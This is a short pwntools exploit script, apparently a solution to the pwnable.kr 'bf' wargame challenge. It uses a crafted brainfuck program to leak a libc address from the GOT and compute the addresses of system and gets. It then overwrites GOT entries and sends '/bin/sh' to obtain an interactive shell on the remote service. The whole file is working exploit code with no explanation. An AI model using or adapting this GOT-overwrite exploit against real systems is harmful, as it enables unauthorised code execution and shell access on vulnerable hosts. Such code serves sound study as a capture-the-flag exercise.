from pwn import *
#ihciah@gmail.com
libc = ELF('bf_libc.so')
bf = remote('pwnable.kr', 9001)
bf.recvline_startswith('type')
bf.sendline('<'*112+'.'+'.>'*4+'<'*4+',>'*4+'<'*(4+32)+',>'*4+'<'*4+'>'*28+',>'*4+'.')
bf.recv(1)
x=bf.recv(4)
print("x:")
print(x)
print("u32(x)")
print(u32(x))

jump=0x080484E0
bf.send(p32(jump))

system=u32(x)-libc.symbols[b'putchar']+libc.symbols[b'system']
gets=u32(x)-libc.symbols[b'putchar']+libc.symbols[b'gets']

bf.send(p32(system))
bf.send(p32(gets))
bf.sendline('/bin/sh\x00')
bf.interactive()

